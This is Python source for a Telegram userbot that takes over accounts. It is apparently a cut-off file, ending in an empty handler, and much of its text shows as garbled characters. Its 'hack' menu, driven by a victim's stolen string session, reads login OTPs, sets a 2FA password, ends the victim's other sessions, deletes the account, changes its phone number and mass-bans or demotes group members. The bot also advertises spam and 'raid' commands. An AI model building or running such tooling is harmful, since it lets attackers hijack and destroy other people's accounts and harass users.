import asyncio
import os
import re
from os import system

from telethon import Button, events

api_id = os.environ.get("APP_ID")
api_hash = os.environ.get("API_HASH")

from Eaglebot import *

from . import *
from .helpers.hack import *

mybot = "@Gaana_MusicBot"

EagleBoy = 7396541413


from telethon import Button, custom, events

from .core.logger import logging
from .core.session import eagle, tgbot

LOGS = logging.getLogger("EagleUserBot")
EAGLE_PIC = "https://telegra.ph/file/70b8271e3153b03ef2cc1.jpg"

onbot = "start - ·¥Ñ ú·¥á·¥Ñ·¥ã …™“ì …™ ·¥Ä·¥ç ·¥Ä ü…™·¥†·¥á \nhelp - ·¥Ñ ú·¥á·¥Ñ·¥ã ·¥Ä ü ü ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö\nalive- \nping - ·¥õ·¥è ·¥Ñ ú·¥á·¥Ñ·¥ã ·¥ò…™…¥…¢ ·¥è“ì  ô·¥è·¥õ\nuinfo - ·¥õ·¥è ·¥Ñ ú·¥á·¥Ñ·¥ã …™…¥“ì·¥è ·¥è“ì ·¥Äss…™s·¥õ·¥Ä…¥·¥õ ·¥Ñ ú·¥Ä·¥õ\nbroadcast -  ô Ä·¥è·¥Ä·¥Ö·¥Ñ·¥Äs·¥õ ·¥ç·¥áss·¥Ä…¢·¥á ·¥õ·¥è ·¥Ä ü ü ·¥õ ú·¥á ·¥ò·¥á Äs·¥è…¥ ·¥° ú·¥è  ú·¥Äs s·¥õ·¥Ä Ä·¥õ·¥á·¥Ö ·¥ú Ä  ô·¥è·¥õ\nban - ·¥õ·¥è  ô·¥Ä…¥ ·¥ò·¥á Äs·¥è…¥ ·¥õ·¥è  ô ü·¥è·¥Ñ·¥ã ·¥ç·¥áss·¥Ä…¢·¥á …™…¥ ·¥Äss…™s·¥õ·¥Ä…¥·¥õ ·¥Ñ ú·¥Ä·¥õ\nunban - ·¥õ·¥è ·¥ú…¥ ô·¥Ä…¥ ·¥ò·¥á Äs·¥è…¥ ·¥Ä ü ü·¥è·¥° ·¥õ·¥è ·¥ç·¥áss·¥Ä…¢·¥á …™…¥ ·¥Äss…™s·¥õ·¥Ä…¥·¥õ ·¥Ñ ú·¥Ä·¥õ\neval - ·¥õ·¥è  Ä·¥ú…¥ ·¥ò è·¥õ ú·¥è…¥ ·¥Ñ·¥è·¥Ö·¥á\npurge - ·¥õ·¥è ·¥ò·¥ú Ä…¢·¥á ·¥ç·¥áss·¥Ä…¢·¥á “ì Ä·¥è·¥ç  Ä·¥á·¥ò ü…™·¥á·¥Ö\ndel - ·¥õ·¥è ·¥Ö·¥á ü·¥á·¥õ·¥á  Ä·¥á·¥ò ü…™·¥á·¥Ö ·¥ç·¥áss·¥Ä…¢·¥á\nbigspam - ·¥õ·¥è s·¥ò·¥Ä·¥ç ·¥õ ú Ä·¥è·¥ú…¢ ú  ô·¥è·¥õ ·¥†·¥Ä ü·¥ú·¥á > 100\ndelayspam - s·¥ò·¥Ä·¥ç ·¥°…™·¥õ ú ·¥Ö·¥á ü·¥Ä è\nraid - ·¥õ·¥è ·¥Ä ô·¥ús·¥á ·¥Ä…¥ è·¥è…¥·¥á  ô è  username/name/reply\nreplyraid - ·¥õ·¥è ·¥Ä·¥Ñ·¥õ…™·¥†·¥Ä·¥õ·¥á  Ä·¥Ä…™·¥Ö ·¥è…¥ ·¥Ä…¥ è·¥è…¥·¥á\ndreplyraid - ·¥õ·¥è s·¥õ·¥è·¥ò  Ä·¥Ä…™·¥Ö\nspam - ·¥õ·¥è s·¥ò·¥Ä·¥ç ·¥°…™·¥õ ú ·¥Ñ ú·¥Ä·¥õ ·¥†·¥Ä ü·¥ú·¥á < 100\nhack -  ú·¥Ä·¥Ñ·¥ã ·¥õ·¥á ü·¥á…¢ Ä·¥Ä·¥ç ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ ·¥õ ú Ä·¥è·¥ú…¢ ú s·¥õ·¥á…™…¥…¢s·¥áss…™·¥è…¥"
perf = "[ ‚ô°_ü´ßùÜºÍØ≠À∂‚Äå‚Äå÷ü·çù‚òÖÔº•ùì™ùò®ƒº‡´Ø‚ÅÇ‚òÖüç∑‚îº‚ù§Ô∏è‡ºÜ ]"

bot = eagle


async def killer():
    EAGLE_USER = bot.me.first_name
    The_EagleBoy = bot.uid
    eag_mention = f"[{EAGLE_USER}](tg://user?id={The_EagleBoy})"
    name = f"{eag_mention}'s ·¥ÄÍú±Íú±…™Íú±·¥õ·¥Ä…¥·¥õ"
    description = (
        f" …™ ·¥Ä·¥ç ·¥Äss…™s·¥õ·¥Ä…¥·¥õ ·¥è“ì{eag_mention}.·¥õ ú…™Íú±  ô·¥è·¥õ ·¥Ñ·¥Ä…¥  ú·¥á ü·¥ò ·¥ú ·¥õ·¥è ·¥Ñ ú·¥Ä·¥õ ·¥°…™·¥õ ú ·¥ç è ·¥ç·¥ÄÍú±·¥õ·¥á Ä"
    )
    starkbot = await eagle.tgbot.get_me()
    bot_name = starkbot.first_name
    botname = f"@{starkbot.username}"
    if bot_name.endswith("Assistant"):
        print("Bot Starting")
    else:
        try:
            await bot.send_message("@BotFather", "/setinline")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", perf)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setcommands")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", onbot)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setname")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", name)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setdescription")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", description)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setuserpic")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_file(
                "@BotFather", "Eaglebot/helpers/resources/pics/main.jpg"
            )
            await asyncio.sleep(2)
        except Exception as e:
            print(e)


@eagle.tgbot.on(events.NewMessage(pattern="/start", func=lambda x: x.is_group))
async def stat(event):
    keybard = [(Button.inline("‚≠ê ·¥Ñ ü…™·¥Ñ·¥ã  ú·¥á Ä·¥á üí´", data="start"))]
    await tgbot.send_message(event.chat_id, f"·¥Ñ ü…™·¥Ñ·¥ã  ô·¥á ü·¥è·¥° ·¥õ·¥è Íú±·¥õ·¥Ä Ä·¥õ", buttons=keybard)


@eagle.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
async def help(event):
    starkbot = await tgbot.get_me()
    bot_id = starkbot.first_name
    if event.query.user_id is not bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=f" ú·¥á è, …™ ·¥Ä·¥ç  è·¥è·¥ú Ä {bot_id}'Íú± ·¥ÄÍú±Íú±…™Íú±·¥õ·¥Ä…¥·¥õ  ô·¥è·¥õ.\n…™ ·¥Ä·¥ç  ú·¥á Ä·¥á ·¥õ·¥è  ú·¥á ü·¥ò ·¥ú\n\n·¥ò·¥è·¥°·¥á Ä·¥á·¥Ö  ô è [‚ô°_ü´ßùÜºÍØ≠À∂‚Äå‚Äå÷ü·çùŒ≤ùù∞ÍØ≠‚Äåùûâ ÍØ≠ùù°ÍØ≠ùûÑÍØ≠ùûåùûâÍØ≠ùù∫ÍØ≠ùÜºÍØ≠üç∑‚îº‚ù§Ô∏è‡ºÜ](https://t.me/ll_BAD_MUNDA_ll)",
            buttons=[
                [
                    Button.url(" ·¥Ñ ú·¥Ä·¥õ …¢ Ä·¥è·¥ú·¥ò ", "https://t.me/PBX_CHAT"),
                    Button.url(" ·¥Ñ ú·¥Ä…¥…¥·¥á ü ", "https://t.me/HEROKUBIN_01"),
                ],
                [
                    custom.Button.inline(" ·¥ús·¥á Äs ", data="users"),
                    custom.Button.inline(" s·¥á·¥õ·¥õ…™…¥…¢s ", data="osg"),
                ],
                [custom.Button.inline("  ú·¥Ä·¥Ñ·¥ã ", data="hack")],
            ],
        )
    else:
        await event.answer(
            " ú è·¥á·¥á·¥á ·¥ç·¥á ü·¥Ä  ô·¥Ä ô·¥úüëª", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"osg")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="·¥° ú…™·¥Ñ ú ·¥õ è·¥ò·¥á ·¥èÍú∞ Íú±·¥á·¥õ·¥õ…™…¥…¢ ·¥Ö·¥è ·¥ú ·¥°·¥Ä…¥·¥õ Íú±…™ Ä",
            buttons=[
                [
                    custom.Button.inline("  Ä·¥ás·¥õ·¥Ä Ä·¥õ ", data="res_tart"),
                ],
                [
                    custom.Button.inline(" s·¥á·¥õ ·¥†·¥Ä Ä", data="strvar"),
                ],
                [custom.Button.inline("  ô·¥Ä·¥Ñ·¥ã ", data="start")],
            ],
        )
    else:
        await event.answer(
            "·¥ç·¥á ü·¥á  ô·¥Ä ô·¥úü•∫‚ù§Ô∏è ",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"shutdown")))
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("ShutDown ‚ô°_ü´ßùÜºÍØ≠À∂‚Äå‚Äå÷ü·çù‚òÖÔº•ùì™ùò®ƒº‡´Ø‚ÅÇ‚òÖüç∑‚îº‚ù§Ô∏è‡ºÜ‚Ä†...", cache_time=0, alert=True)
        if BOTLOG:
            await event.client.send_message(
                BOTLOG_CHATID, "#SHUTDOWN \n" "Bot shut down"
            )
        if HEROKU_APP is not None:
            HEROKU_APP.process_formation()["worker"].scale(0)
        else:
            os._exit(143)
    else:
        await event.answer(
            "Íú±·¥è Ä Ä è ·¥ú ·¥Ö·¥è…¥·¥õ  ú·¥Ä·¥†·¥á ·¥Ä·¥Ñ·¥Ñ·¥áÍú±Íú± ·¥õ·¥è ·¥úÍú±·¥á ·¥õ ú…™Íú±  ô·¥ú·¥õ·¥õ·¥è…¥", cache_time=0, alert=True
        )


@eagle.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
async def res_ttart(event):
    if event.query.user_id == bot.uid:
        await event.answer(" Ä·¥áÍú±·¥õ·¥Ä Ä·¥õ…™…¥…¢ ·¥ò ü·¥á·¥ÄÍú±·¥á ·¥°·¥Ä…™·¥õ 4 ·¥ç…™…¥... ", cache_time=0, alert=True)
        if BOTLOG:
            EAGLE = await event.client.send_message(
                BOTLOG_CHATID, "# RESTART \n" "Bot Restarted"
            )
        try:
            await eagle.disconnect()
        except CancelledError:
            pass
        except Exception as e:
            LOGS.error(e)
    else:
        await event.answer(
            "Íú±·¥è Ä Ä è ·¥è…¥ ü è ·¥ç è ·¥ç·¥ÄÍú±·¥õ·¥á Ä ·¥Ñ·¥Ä…¥ ·¥Ä·¥Ñ·¥Ñ·¥áÍú±Íú± …™·¥õ", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"strvar")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="·¥° ú…™·¥Ñ ú ·¥õ è·¥ò·¥á ·¥èÍú∞ Íú±·¥á·¥õ·¥õ…™…¥…¢ ·¥Ö·¥è ·¥ú ·¥°·¥Ä…¥·¥õ Íú±…™ Ä",
            buttons=[
                [
                    custom.Button.inline(" s·¥á·¥õ ·¥†·¥Ä Ä ", data="setvar"),
                    custom.Button.inline(" …¢·¥á·¥õ ·¥†·¥Ä Ä ", data="gevar"),
                ],
                [custom.Button.inline(" ·¥Ö·¥á ü ·¥†·¥Ä Ä ", data="delvar")],
            ],
        )
    else:
        await event.answer("Íú±·¥è Ä Ä è ·¥õ ú…™Íú±  ô·¥ú·¥õ·¥õ·¥è…¥ ·¥è…¥ ü è ·¥ç è ·¥ç·¥ÄÍú±·¥õ·¥á Ä", cache_time=0, alert=True)


@eagle.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"setvar")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        if (Config.API_KEY is None) or (Config.APP_NAME is None):
            return await x.send_message(
                "Set the required vars in heroku to function this normally `API_KEY` and `APP_NAME`.",
            )
        await x.send_message("üë®‚Äçüíª GIVE VAR NAME")
        variable = await x.get_response()
        await x.send_message("üë®‚Äçüíª GIVE VALUE")
        value = await x.get_response()
        await setvar(variable.text, value.text)
        await event.reply("Done Now Wait For A Minute To Complete Logs")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"getvar")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        if (Config.API_KEY is None) or (Config.APP_NAME is None):
            return await x.send_message(
                "Set the required vars in heroku to function this normally `API_KEY` and `APP_NAME`.",
            )
        await x.send_message("üë®‚Äçüíª GIVE VAR NAME")
        variable = await x.get_response()
        lol = await getvar(variable.text)
        await event.reply(f"{lol}")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"delvar")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        if (Config.API_KEY is None) or (Config.APP_NAME is None):
            return await x.send_message(
                "Íú±·¥á·¥õ ·¥õ ú·¥á  Ä·¥áQ·¥ú…™ Ä·¥á·¥Ö ·¥†·¥Ä ÄÍú± …™…¥  ú·¥á Ä·¥è·¥ã·¥ú ·¥õ·¥è Íú∞·¥ú…¥·¥Ñ·¥õ…™·¥è…¥ ·¥õ ú…™Íú± …¥·¥è Ä·¥ç·¥Ä ü ü è `API_KEY` and `APP_NAME`.",
            )
        await x.send_message("üë®‚Äçüíª GIVE VAR NAME")
        variable = await x.get_response()
        lol = await delvar(variable.text)
        await event.reply(f"·¥Ö·¥è…¥·¥á …¥·¥è·¥° ·¥°·¥Ä…™·¥õ Íú∞·¥è Ä ·¥Ä ·¥ç…™…¥·¥ú·¥õ·¥á ·¥õ·¥è ·¥Ñ·¥è·¥ç·¥ò ü·¥á·¥õ·¥á  ü·¥è…¢Íú± \n\n {lol}")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"close")))
async def help(event):
    await event.delete()


menu = """
 Ä·¥á·¥ò ü è ·¥õ·¥è ·¥ç è ·¥ç·¥áÍú±Íú±·¥Ä…¢·¥á …™Íú∞ …™ ·¥Ä·¥ç ·¥úÍú±…™…¥…¢ …™…¥ …¢ Ä·¥è·¥ú·¥ò üí´

"A" :~ [·¥Ñ ú·¥á·¥Ñ·¥ã ·¥úÍú±·¥á Ä ·¥è·¥°…¥ …¢ Ä·¥è·¥ú·¥òÍú± ·¥Ä…¥·¥Ö ·¥Ñ ú·¥Ä…¥…¥·¥á üÍú±]

"B" :~ [·¥Ñ ú·¥á·¥Ñ·¥ã ·¥úÍú±·¥á Ä ·¥Ä ü ü …™…¥Íú∞·¥è Ä·¥ç·¥Ä·¥õ…™·¥è…¥  ü…™·¥ã·¥á ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä, ·¥úÍú± Ä…¥·¥Ä·¥ç·¥á... ·¥á·¥õ·¥Ñ]

"C" :~ [ ô·¥Ä…¥ ·¥Ä …¢ Ä·¥è·¥ú·¥ò {…¢…™·¥†·¥á ·¥ç·¥á Íú±·¥õ Ä…™…¥…¢Íú±·¥áÍú±Íú±…™·¥è…¥ ·¥Ä…¥·¥Ö ·¥Ñ ú·¥Ä…¥…¥·¥á ü/…¢ Ä·¥è·¥ú·¥ò ·¥úÍú±·¥á Ä…¥·¥Ä·¥ç·¥á …™ ·¥°…™ ü ü  ô·¥Ä…¥ ·¥Ä ü ü ·¥ç·¥á·¥ç ô·¥á ÄÍú± ·¥õ ú·¥á Ä·¥á}]

"D" :~ [·¥ã…¥·¥è·¥° ·¥úÍú±·¥á Ä  ü·¥ÄÍú±·¥õ ·¥è·¥õ·¥ò {1Íú±·¥õ ·¥úÍú±·¥á ·¥è·¥ò·¥õ…™·¥è…¥  ô ·¥õ·¥Ä·¥ã·¥á ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä ·¥Ä…¥·¥Ö  ü·¥è…¢…™…¥ ·¥õ ú·¥á Ä·¥á ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ ·¥õ ú·¥á…¥ ·¥úÍú±·¥á ·¥ç·¥á …™ ·¥°…™ ü ü …¢…™·¥†·¥á  è·¥è·¥ú ·¥è·¥õ·¥ò}]

"E" :~ [·¥ä·¥è…™…¥ ·¥Ä …¢ Ä·¥è·¥ú·¥ò/·¥Ñ ú·¥Ä…¥…¥·¥á ü ·¥†…™·¥Ä Íú±·¥õ Ä…™…¥…¢Íú±·¥áÍú±Íú±…™·¥è…¥]

"F" :~ [ ü·¥á·¥Ä·¥†·¥á ·¥Ä …¢ Ä·¥è·¥ú·¥ò/·¥Ñ ú·¥Ä…¥…¥·¥á ü ·¥†…™·¥Ä Íú±·¥õ Ä…™…¥…¢Íú±·¥áÍú±Íú±…™·¥è…¥]

"G" :~ [·¥Ö·¥á ü·¥á·¥õ·¥á ·¥Ä …¢ Ä·¥è·¥ú·¥ò/·¥Ñ ú·¥Ä…¥…¥·¥á ü]

"H" :~ [·¥Ñ ú·¥á·¥Ñ·¥ã ·¥úÍú±·¥á Ä ·¥õ·¥°·¥è Íú±·¥õ·¥á·¥ò …™Íú± ·¥á…¥·¥á·¥Ä ô ü·¥á ·¥è Ä ·¥Ö…™Íú±·¥Ä ô ü·¥á]

"I" :~ [·¥õ·¥á Ä·¥ç…™…¥·¥Ä·¥õ·¥á ·¥Ä ü ü ·¥Ñ·¥ú Ä Ä·¥á…¥·¥õ ·¥Ä·¥Ñ·¥õ…™·¥†·¥á Íú±·¥áÍú±Íú±…™·¥è…¥Íú± ·¥áx·¥Ñ·¥á·¥ò·¥õ  è·¥è·¥ú Ä Íú±·¥õ Ä…™…¥…¢Íú±·¥áÍú±Íú±…™·¥è…¥]

"J" :~ [·¥Ö·¥á ü·¥á·¥õ·¥á ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ]

"K" :~ [·¥Ö·¥á·¥ç·¥è·¥õ·¥á ·¥Ä ü ü ·¥Ä·¥Ö·¥ç…™…¥Íú± …™…¥ ·¥Ä …¢ Ä·¥è·¥ú·¥ò/·¥Ñ ú·¥Ä…¥…¥·¥á ü]

"L" ~ [·¥ò Ä·¥è·¥ç·¥è·¥õ·¥á ·¥Ä ·¥ç·¥á·¥ç ô·¥á Ä …™…¥ ·¥Ä …¢ Ä·¥è·¥ú·¥ò/·¥Ñ ú·¥Ä…¥…¥·¥á ü]

"M" ~ [·¥Ñ ú·¥Ä…¥…¢·¥á ·¥ò ú·¥è…¥·¥á …¥·¥ú·¥ç ô·¥á Ä ·¥úÍú±…™…¥…¢ Íú±·¥õ Ä…™…¥…¢Íú±·¥áÍú±Íú±…™·¥è…¥]

·¥Ñ ú…™ ü ü  ô·¥Ä ô è ü¶Ö
"""

keyboard = [
    [
        Button.inline("A", data="Ahack"),
        Button.inline("B", data="Bhack"),
        Button.inline("C", data="Chack"),
        Button.inline("D", data="Dhack"),
        Button.inline("E", data="Ehack"),
    ],
    [
        Button.inline("F", data="Fhack"),
        Button.inline("G", data="Ghack"),
        Button.inline("H", data="Hhack"),
        Button.inline("I", data="Ihack"),
        Button.inline("J", data="Jhack"),
    ],
    [
        Button.inline("K", data="Khack"),
        Button.inline("L", data="Lhack"),
        Button.inline("M", data="Mhack"),
        Button.inline("N", data="Nhack"),
        Button.inline("O", data="Ohack"),
    ],
    [Button.inline("Back", data="osg")],
]


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"hack")))
async def start(event):
    global menu
    if event.query.user_id == bot.uid:
        await event.delete()
        async with tgbot.conversation(event.chat_id) as x:
            await x.send_message(
                f"·¥Ñ ú·¥è·¥èÍú±·¥á ·¥° ú·¥Ä·¥õ  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥°…™·¥õ ú Íú±·¥õ Ä…™…¥…¢ Íú±·¥áÍú±Íú±…™·¥è…¥ \n\n{menu}", buttons=keyboard
            )
    else:
        await event.answer(
            "·¥ú ·¥Ö·¥è…¥·¥õ  ú·¥Ä·¥†·¥á  Ä…™…¢ ú·¥õ ·¥õ·¥è ·¥Ä·¥Ñ·¥Ñ·¥áÍú±Íú± ·¥õ ú…™Íú±  ú·¥Ä·¥Ñ·¥ã  ô·¥ú·¥õ·¥õ·¥è…¥", cache_time=0, alert=True
        )


@eagle.tgbot.on(
    events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid)
)
async def start(event):
    global menu
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message(
            f"·¥Ñ ú·¥è·¥èÍú±·¥á ·¥° ú·¥Ä·¥õ  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥°…™·¥õ ú Íú±·¥õ Ä…™…¥…¢ Íú±·¥áÍú±Íú±…™·¥è…¥ \n\n{menu}", buttons=keyboard
        )


@eagle.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("üìçGIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.\n /hack", buttons=keyboard
            )
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply(
                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
            )
        if len(i) > 3855:
            file = open("session.txt", "w")
            file.write(i + "\n\nDetails BY EagleBoy")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(
                i + "\n\nThanks For using EagleBoyBot. \n/hack", buttons=keyboard
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Bhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("üî∞GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
            )
        i = await userinfo(strses.text)
        await event.reply(
            i + "\n\nThanks For using EagleBoy Bot.\n/hack", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Chack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "String Session Has Been Terminated", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply(
            "Banning all members. Thanks For using EagleBoy Bot", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Dhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        i = await usermsgs(strses.text)
        await event.reply(i + "\n\nThanks For using EagleBoy Bot", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply(
            "Joined the Channel/Group Thanks For using EagleBoy Bot", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Fhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply(
            "Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ghack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await delgroup(strses.text, grpid.text)
        await event.reply(
            "Deleted the Channel/Group Thanks For using EagleBoyBot.", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Hhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession is terminated maybe.", buttons=keyboard
            )
        i = await user2fa(strses.text)
        if i:
            await event.reply(
                "User don't have two step thats why now two step is `EagleBoy Bot Is best` you can login now\n\nThanks For using EagleBoy Bot.",
                buttons=keyboard,
            )
        else:
            await event.reply("Sorry User Have two step already", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ihack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await terminate(strses.text)
        await event.reply(
            "The all sessions are terminated\n\nThanks For using EagleBoyBot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Jhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await delacc(strses.text)
        await event.reply(
            "The Account is deleted SUCCESSFULLLY\n\nThanks For using EagleBoy Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Khack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        grp = await x.get_response()
        await x.send_message("NOW GIVE USER USERNAME")
        user = await x.get_response()
        await promote(strses.text, grp.text, user.text)
        await event.reply(
            "I am Promoting you in Group/Channel wait a min üòóüòó\n\nThanks For Using EagleBoy Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Lhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        pro = await x.get_response()
        try:
            await demall(strses.text, pro.text)
        except:
            pass
        await event.reply(
            "I am Demoting all members of Group/Channel wait a min üòóüòó\n\nThanks For using EagleBoyBot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Mhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession is terminated maybe", buttons=keyboard
            )
        await x.send_message(
            "GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] "
        )
        number = (await x.get_response()).text
        try:
            result = await change_number(strses.text, number)
            await event.respond(
                result
                + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp"
            )
            await asyncio.sleep(20)
            await x.send_message("NOW GIVE PHONE CODE HASH")
            phone_code_hash = (await x.get_response()).text
            await x.send_message("NOW GIVE THE OTP")
            otp = (await x.get_response()).text
            changing = await change_number_code(
                strses.text, number, phone_code_hash, otp
            )
            if changing:
                await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
            else:
                await event.respond("Something is wrong")
        except Exception as e:
            await event.respond(
                "SEND THIS ERROR TO - @PBX_CHAT\n**LOGS**\n" + str(e)
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ohack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE USER USERNAME")
        user = await x.get_response()
        await gpromote(strses.text, user.text)
        await event.reply(
            "I am Promoting you in Group/Channel wait a min üòóüòó\n\nThanks For Using EagleBoy Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Nhack")))
async def users(event):
